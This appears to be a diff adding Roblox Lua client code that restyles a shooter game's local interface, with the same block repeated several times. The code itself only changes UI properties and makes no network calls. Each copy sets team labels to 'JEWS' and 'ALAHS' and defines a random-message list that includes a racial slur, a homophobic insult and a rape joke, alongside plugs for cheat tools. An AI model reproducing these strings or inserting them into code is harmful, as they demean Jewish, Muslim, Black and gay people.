+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
